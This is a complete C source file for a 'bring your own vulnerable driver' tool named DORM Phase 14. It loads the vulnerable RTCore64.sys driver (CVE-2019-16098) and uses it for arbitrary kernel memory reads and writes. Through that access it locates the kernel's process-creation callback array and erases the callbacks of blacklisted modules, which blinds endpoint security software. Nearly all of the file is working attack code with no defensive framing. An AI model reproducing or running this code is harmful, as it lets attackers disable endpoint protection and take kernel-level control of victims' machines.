/*
 * byovd.c -- DORM Phase 14: BYOVD Kernel Subversion Engine
 * byovd/kernel_subverter/byovd.c
 *
 * Windows x64 | MinGW/Clang | ring-3
 *
 * RTCore64.sys IOCTL protocol (SHA256 F1C8CA23...):
 *   IOCTL 0x80002048 -- MmReadMemory
 *   IOCTL 0x8000204C -- MmWriteMemory
 *
 * Buffer layout -- 32 bytes (0x20) exactly:
 *   +0x00  BYTE[8]  Padding   must be 0
 *   +0x08  ULONG64  Address   kernel VA
 *   +0x10  ULONG    Pad2      must be 0
 *   +0x14  ULONG    Size      1 / 2 / 4  (NOT 8)
 *   +0x18  ULONG    Value     output on read / input on write
 *   +0x1C  ULONG    Pad3      must be 0
 *           = 0x20 = 32 bytes
 *
 * Verified against Barakat CVE-2019-16098 PoC layout.
 */

#include <stdio.h>
#include <string.h>
#include <stddef.h>
#include <time.h>
#include <windows.h>

#include "byovd.h"

/* ============================================================
   CONSTANTS
   ============================================================ */

#define RTCORE64_SVC_NAME    "RTCore64"
#define RTCORE64_DEVICE      "\\\\.\\RTCore64"
#define RTCORE64_IOCTL_READ  0x80002048UL
#define RTCORE64_IOCTL_WRITE 0x8000204CUL

#define PSPCRN_MAX_ENTRIES  64UL
#define EX_CB_FUNC_OFFSET   8ULL
#define SYSTINFO_MODULES    11UL

/* ============================================================
   RTCORE64 MEMORY OPERATION STRUCTURE -- 32 bytes exactly
   ============================================================ */

#pragma pack(push, 1)
typedef struct {
    BYTE    Padding[8];  /* +0x00  must be zero          */
    ULONG64 Address;     /* +0x08  kernel VA             */
    ULONG   Pad2;        /* +0x10  must be zero          */
    ULONG   Size;        /* +0x14  1 / 2 / 4 only        */
    ULONG   Value;       /* +0x18  in=write / out=read   */
    ULONG   Pad3;        /* +0x1C  must be zero          */
} RTCORE64_MEM_OP;       /* total = 0x20 = 32 bytes      */
#pragma pack(pop)

_Static_assert(sizeof(RTCORE64_MEM_OP) == 0x20,
               "RTCORE64_MEM_OP must be 32 bytes");

/* ============================================================
   NT INTERNALS
   ============================================================ */

typedef NTSTATUS (NTAPI *NtQSI_t)(ULONG, PVOID, ULONG, PULONG);

#define STATUS_SUCCESS              ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)

typedef struct {
    ULONG_PTR Reserved[2];
    PVOID     ImageBase;
    ULONG     ImageSize;
    ULONG     Flags;
    WORD      LoadOrderIndex;
    WORD      InitOrderIndex;
    WORD      LoadCount;
    WORD      OffsetToFileName;
    CHAR      FullPathName[256];
} DORM_SYS_MODULE;

typedef struct {
    ULONG           Count;
    DORM_SYS_MODULE Modules[1];
} DORM_SYS_MODULE_INFO;

/* ============================================================
   MODULE STATE
   ============================================================ */

static HANDLE g_device        = INVALID_HANDLE_VALUE;
static char   g_driver_path[MAX_PATH] = {0};
static BOOL   g_service_created      = FALSE;

/* ============================================================
   JSON + I/O HELPERS
   ============================================================ */

static void json_escape(FILE *fp, const char *s)
{
    if (!s) { fputs("\"\"", fp); return; }
    fputc('"', fp);
    for (const char *p = s; *p; p++) {
        switch (*p) {
            case '"':  fputs("\\\"", fp); break;
            case '\\': fputs("\\\\", fp); break;
            case '\n': fputs("\\n",  fp); break;
            case '\r': fputs("\\r",  fp); break;
            default:
                if ((unsigned char)*p < 0x20)
                    fprintf(fp, "\\u%04X", (unsigned char)*p);
                else fputc(*p, fp);
        }
    }
    fputc('"', fp);
}

static FILE *open_output(const char *path)
{
    if (!path || strcmp(path, "-") == 0) return stdout;
    FILE *fp = NULL; fopen_s(&fp, path, "w"); return fp;
}

static void ts_now(char *buf, int len)
{
    time_t n = time(NULL);
    struct tm *g = gmtime(&n);
    strftime(buf, len, "%Y-%m-%dT%H:%M:%SZ", g);
}

/* ============================================================
   DRIVER LOAD / UNLOAD
   ============================================================ */

BOOL byovd_load(const char *driver_path)
{
    strncpy(g_driver_path, driver_path, MAX_PATH - 1);

    char abs_path[MAX_PATH] = {0};
    if (!GetFullPathNameA(driver_path, MAX_PATH, abs_path, NULL)) {
        printf("[byovd] GetFullPathNameA failed error=%lu\n", GetLastError());
        return FALSE;
    }
    if (GetFileAttributesA(abs_path) == INVALID_FILE_ATTRIBUTES) {
        printf("[byovd] driver not found: %s\n", abs_path);
        return FALSE;
    }

    SC_HANDLE hScm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hScm) {
        printf("[byovd] OpenSCManager failed error=%lu\n", GetLastError());
        return FALSE;
    }

    /* clean up stale service */
    SC_HANDLE hSvc = OpenServiceA(hScm, RTCORE64_SVC_NAME, SERVICE_ALL_ACCESS);
    if (hSvc) {
        SERVICE_STATUS ss = {0};
        ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
        DeleteService(hSvc);
        CloseServiceHandle(hSvc);
        Sleep(500);
    }

    hSvc = CreateServiceA(hScm, RTCORE64_SVC_NAME, RTCORE64_SVC_NAME,
                          SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                          SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
                          abs_path, NULL, NULL, NULL, NULL, NULL);
    if (!hSvc) {
        printf("[byovd] CreateService failed error=%lu\n", GetLastError());
        CloseServiceHandle(hScm); return FALSE;
    }
    g_service_created = TRUE;

    if (!StartServiceA(hSvc, 0, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            printf("[byovd] StartService failed error=%lu\n", err);
            DeleteService(hSvc);
            CloseServiceHandle(hSvc);
            CloseServiceHandle(hScm);
            return FALSE;
        }
    }

    printf("[byovd] RTCore64.sys loaded -- service started\n");
    CloseServiceHandle(hSvc);
    CloseServiceHandle(hScm);
    Sleep(300);
    return TRUE;
}

BOOL byovd_unload(void)
{
    byovd_close();
    SC_HANDLE hScm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hScm) return FALSE;
    SC_HANDLE hSvc = OpenServiceA(hScm, RTCORE64_SVC_NAME, SERVICE_ALL_ACCESS);
    BOOL ok = FALSE;
    if (hSvc) {
        SERVICE_STATUS ss = {0};
        ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
        Sleep(200);
        ok = DeleteService(hSvc);
        CloseServiceHandle(hSvc);
        printf("[byovd] RTCore64.sys unloaded -- service deleted\n");
    }
    CloseServiceHandle(hScm);
    return ok;
}

/* ============================================================
   DEVICE HANDLE
   ============================================================ */

BOOL byovd_open(void)
{
    g_device = CreateFileA(RTCORE64_DEVICE,
                           GENERIC_READ | GENERIC_WRITE,
                           0, NULL, OPEN_EXISTING,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    if (g_device == INVALID_HANDLE_VALUE) {
        printf("[byovd] CreateFile(%s) failed error=%lu\n",
               RTCORE64_DEVICE, GetLastError());
        return FALSE;
    }
    printf("[byovd] device handle opened: %p\n", (void *)g_device);
    return TRUE;
}

void byovd_close(void)
{
    if (g_device != INVALID_HANDLE_VALUE) {
        CloseHandle(g_device);
        g_device = INVALID_HANDLE_VALUE;
    }
}

/* ============================================================
   KERNEL R/W PRIMITIVE
   RTCore64 max Size = 4.  8-byte ops use two 4-byte calls.
   ============================================================ */

BOOL byovd_read4(ULONG64 addr, ULONG *out)
{
    if (g_device == INVALID_HANDLE_VALUE) return FALSE;
    RTCORE64_MEM_OP op;
    ZeroMemory(&op, sizeof(op));
    op.Address = addr;
    op.Size    = 4;
    DWORD ret  = 0;
    if (!DeviceIoControl(g_device, RTCORE64_IOCTL_READ,
                         &op, sizeof(op), &op, sizeof(op), &ret, NULL)) {
        printf("[byovd] read4(0x%016llX) failed error=%lu\n",
               (unsigned long long)addr, GetLastError());
        return FALSE;
    }
    *out = op.Value;
    return TRUE;
}

BOOL byovd_write4(ULONG64 addr, ULONG value)
{
    if (g_device == INVALID_HANDLE_VALUE) return FALSE;
    RTCORE64_MEM_OP op;
    ZeroMemory(&op, sizeof(op));
    op.Address = addr;
    op.Size    = 4;
    op.Value   = value;
    DWORD ret  = 0;
    if (!DeviceIoControl(g_device, RTCORE64_IOCTL_WRITE,
                         &op, sizeof(op), &op, sizeof(op), &ret, NULL)) {
        printf("[byovd] write4(0x%016llX) failed error=%lu\n",
               (unsigned long long)addr, GetLastError());
        return FALSE;
    }
    return TRUE;
}

BOOL byovd_read8(ULONG64 addr, ULONG64 *out)
{
    ULONG lo = 0, hi = 0;
    if (!byovd_read4(addr,     &lo)) return FALSE;
    if (!byovd_read4(addr + 4, &hi)) return FALSE;
    *out = ((ULONG64)hi << 32) | (ULONG64)lo;
    return TRUE;
}

BOOL byovd_write8(ULONG64 addr, ULONG64 value)
{
    if (!byovd_write4(addr,     (ULONG)( value        & 0xFFFFFFFF))) return FALSE;
    if (!byovd_write4(addr + 4, (ULONG)((value >> 32) & 0xFFFFFFFF))) return FALSE;
    return TRUE;
}

/* ============================================================
   KERNEL BASE RESOLUTION
   ============================================================ */

ULONG64 byovd_get_kernel_base(void)
{
    NtQSI_t NtQSI = (NtQSI_t)GetProcAddress(
                        GetModuleHandleA("ntdll.dll"),
                        "NtQuerySystemInformation");
    if (!NtQSI) return 0;

    ULONG    sz  = 0x20000;
    BYTE    *buf = NULL;
    NTSTATUS nt;
    do {
        HeapFree(GetProcessHeap(), 0, buf);
        buf = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sz);
        if (!buf) return 0;
        nt = NtQSI(SYSTINFO_MODULES, buf, sz, &sz);
        sz += 0x1000;
    } while (nt == STATUS_INFO_LENGTH_MISMATCH);

    ULONG64 base = 0;
    if (nt == STATUS_SUCCESS) {
        DORM_SYS_MODULE_INFO *mi = (DORM_SYS_MODULE_INFO *)buf;
        if (mi->Count > 0)
            base = (ULONG64)(ULONG_PTR)mi->Modules[0].ImageBase;
    }
    HeapFree(GetProcessHeap(), 0, buf);
    return base;
}

/* ============================================================
   EXPORT RESOLUTION (disk PE -> kernel VA)
   ============================================================ */

ULONG64 byovd_resolve_export(ULONG64 kernel_base, const char *export_name)
{
    NtQSI_t NtQSI = (NtQSI_t)GetProcAddress(
                        GetModuleHandleA("ntdll.dll"),
                        "NtQuerySystemInformation");
    if (!NtQSI) return 0;

    ULONG    sz  = 0x20000;
    BYTE    *buf = NULL;
    NTSTATUS nt;
    do {
        HeapFree(GetProcessHeap(), 0, buf);
        buf = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sz);
        if (!buf) return 0;
        nt = NtQSI(SYSTINFO_MODULES, buf, sz, &sz);
        sz += 0x1000;
    } while (nt == STATUS_INFO_LENGTH_MISMATCH);

    if (nt != STATUS_SUCCESS) { HeapFree(GetProcessHeap(), 0, buf); return 0; }

    DORM_SYS_MODULE_INFO *mi = (DORM_SYS_MODULE_INFO *)buf;
    char disk_path[MAX_PATH] = {0};

    if (mi->Count > 0) {
        const char *fp = mi->Modules[0].FullPathName;
        if (_strnicmp(fp, "\\SystemRoot\\", 12) == 0) {
            char win_dir[MAX_PATH] = {0};
            GetWindowsDirectoryA(win_dir, MAX_PATH);
            snprintf(disk_path, MAX_PATH - 1, "%s\\%s", win_dir, fp + 12);
        } else {
            strncpy(disk_path, fp, MAX_PATH - 1);
        }
    }
    HeapFree(GetProcessHeap(), 0, buf);
    if (!disk_path[0]) return 0;

    HANDLE hFile = CreateFileA(disk_path, GENERIC_READ,
                               FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;

    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMap) { CloseHandle(hFile); return 0; }

    BYTE   *disk   = (BYTE *)MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    ULONG64 result = 0;

    if (disk) {
        IMAGE_DOS_HEADER    *dos  = (IMAGE_DOS_HEADER *)disk;
        IMAGE_NT_HEADERS64  *nt64 = (IMAGE_NT_HEADERS64 *)(disk + dos->e_lfanew);
        IMAGE_DATA_DIRECTORY *dd  =
            &nt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

        if (dd->VirtualAddress && dd->Size) {
            IMAGE_EXPORT_DIRECTORY *exp =
                (IMAGE_EXPORT_DIRECTORY *)(disk + dd->VirtualAddress);
            DWORD *names    = (DWORD *)(disk + exp->AddressOfNames);
            WORD  *name_ord = (WORD  *)(disk + exp->AddressOfNameOrdinals);
            DWORD *funcs    = (DWORD *)(disk + exp->AddressOfFunctions);

            for (DWORD i = 0; i < exp->NumberOfNames; i++) {
                if (strcmp((const char *)(disk + names[i]), export_name) == 0) {
                    result = kernel_base + funcs[name_ord[i]];
                    break;
                }
            }
        }
        UnmapViewOfFile(disk);
    }
    CloseHandle(hMap);
    CloseHandle(hFile);
    return result;
}

/* ============================================================
   LOCATE PspCreateProcessNotifyRoutine
   Scan PsSetCreateProcessNotifyRoutine body for:
     48 8D 15 xx xx xx xx   LEA RDX,[RIP+disp32]
     48 8D 0D xx xx xx xx   LEA RCX,[RIP+disp32]
   ============================================================ */

static ULONG64 find_pspcrn_array(ULONG64 kernel_base)
{
    ULONG64 fn_va = byovd_resolve_export(kernel_base,
                                          "PsSetCreateProcessNotifyRoutine");
    if (!fn_va) {
        printf("[byovd] PsSetCreateProcessNotifyRoutine not found\n");
        return 0;
    }
    printf("[byovd] PsSetCreateProcessNotifyRoutine @ 0x%016llX\n",
           (unsigned long long)fn_va);

    BYTE body[512] = {0};
    for (int i = 0; i < (int)sizeof(body); i += 8) {
        ULONG64 quad = 0;
        if (!byovd_read8(fn_va + i, &quad)) break;
        memcpy(body + i, &quad, 8);
    }

    for (int i = 0; i < (int)sizeof(body) - 7; i++) {
        if (body[i]   != 0x48 ||
            body[i+1] != 0x8D ||
           (body[i+2] != 0x15 && body[i+2] != 0x0D))
            continue;

        INT32   disp      = *(INT32 *)(body + i + 3);
        ULONG64 candidate = fn_va + i + 7 + disp;

        printf("[byovd] candidate array @ 0x%016llX  (scan +%d)\n",
               (unsigned long long)candidate, i);

        if ((candidate >> 48) != 0xFFFF) continue;
        return candidate;
    }

    printf("[byovd] PspCreateProcessNotifyRoutine scan failed\n");
    return 0;
}

/* ============================================================
   MODULE NAME FROM KERNEL VA
   ============================================================ */

static BOOL va_to_module(ULONG64 va, char *name_out, int name_len,
                          DORM_SYS_MODULE_INFO *mi)
{
    for (ULONG i = 0; i < mi->Count; i++) {
        ULONG64 base = (ULONG64)(ULONG_PTR)mi->Modules[i].ImageBase;
        ULONG64 end  = base + mi->Modules[i].ImageSize;
        if (va >= base && va < end) {
            const char *fn = mi->Modules[i].FullPathName
                           + mi->Modules[i].OffsetToFileName;
            strncpy(name_out, fn, name_len - 1);
            return TRUE;
        }
    }
    name_out[0] = '\0';
    return FALSE;
}

/* ============================================================
   CALLBACK ENUMERATION + REMOVAL
   ============================================================ */

int dorm_enum_process_callbacks(const char *output_path)
{
    return dorm_remove_process_callbacks(NULL, 0, output_path);
}

int dorm_remove_process_callbacks(const char **blacklist,
                                   int          bl_count,
                                   const char  *output_path)
{
    ULONG64 kernel_base = byovd_get_kernel_base();
    if (!kernel_base) {
        printf("[byovd] cannot resolve kernel base\n");
        return -1;
    }
    printf("[byovd] ntoskrnl base: 0x%016llX\n",
           (unsigned long long)kernel_base);

    ULONG64 arr = find_pspcrn_array(kernel_base);
    if (!arr) return -1;

    NtQSI_t NtQSI = (NtQSI_t)GetProcAddress(
                        GetModuleHandleA("ntdll.dll"),
                        "NtQuerySystemInformation");
    ULONG  mi_sz  = 0x40000;
    BYTE  *mi_buf = NULL;
    NTSTATUS nt;
    do {
        HeapFree(GetProcessHeap(), 0, mi_buf);
        mi_buf = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, mi_sz);
        if (!mi_buf) return -1;
        nt = NtQSI(SYSTINFO_MODULES, mi_buf, mi_sz, &mi_sz);
        mi_sz += 0x1000;
    } while (nt == STATUS_INFO_LENGTH_MISMATCH);

    if (nt != STATUS_SUCCESS) {
        HeapFree(GetProcessHeap(), 0, mi_buf);
        return -1;
    }
    DORM_SYS_MODULE_INFO *mi = (DORM_SYS_MODULE_INFO *)mi_buf;

    FILE *fp = open_output(output_path);
    if (!fp) { HeapFree(GetProcessHeap(), 0, mi_buf); return -1; }

    char ts[32] = {0}; ts_now(ts, sizeof(ts));
    fprintf(fp,
        "{\n"
        "  \"collector\": \"byovd_process_callbacks\",\n"
        "  \"timestamp_utc\": \"%s\",\n"
        "  \"kernel_base\": \"0x%016llX\",\n"
        "  \"PspCreateProcessNotifyRoutine\": \"0x%016llX\",\n"
        "  \"callbacks\": [\n",
        ts,
        (unsigned long long)kernel_base,
        (unsigned long long)arr);

    int  found   = 0;
    int  removed = 0;
    BOOL first   = TRUE;

    for (ULONG i = 0; i < PSPCRN_MAX_ENTRIES; i++) {
        ULONG64 entry = 0;
        if (!byovd_read8(arr + i * 8, &entry)) continue;
        if (!entry) continue;

        ULONG64 block_ptr  = entry & ~0xFULL;
        if (!block_ptr) continue;

        ULONG64 callback_fn = 0;
        if (!byovd_read8(block_ptr + EX_CB_FUNC_OFFSET, &callback_fn)) continue;
        if (!callback_fn) continue;

        char module_name[256] = {0};
        va_to_module(callback_fn, module_name, sizeof(module_name), mi);

        BOOL is_blacklisted = FALSE;
        for (int b = 0; b < bl_count; b++) {
            if (blacklist[b] && _stricmp(module_name, blacklist[b]) == 0) {
                is_blacklisted = TRUE; break;
            }
        }

        if (!first) fputs(",\n", fp);
        first = FALSE;

        fprintf(fp,
            "    {\"index\":%lu,"
            "\"entry\":\"0x%016llX\","
            "\"block\":\"0x%016llX\","
            "\"callback\":\"0x%016llX\","
            "\"module\":",
            i,
            (unsigned long long)entry,
            (unsigned long long)block_ptr,
            (unsigned long long)callback_fn);
        json_escape(fp, module_name[0] ? module_name : "<unknown>");

        if (is_blacklisted && blacklist) {
            if (byovd_write8(arr + i * 8, 0)) {
                fputs(",\"action\":\"REMOVED\"}", fp);
                printf("[byovd] removed callback[%lu] -- %s\n", i, module_name);
                removed++;
            } else {
                fputs(",\"action\":\"REMOVE_FAILED\"}", fp);
            }
        } else {
            fputs(",\"action\":\"kept\"}", fp);
        }
        found++;
    }

    fprintf(fp,
        "\n  ],\n"
        "  \"callbacks_found\": %d,\n"
        "  \"callbacks_removed\": %d\n"
        "}\n", found, removed);

    if (fp != stdout) fclose(fp);
    HeapFree(GetProcessHeap(), 0, mi_buf);
    return found;
}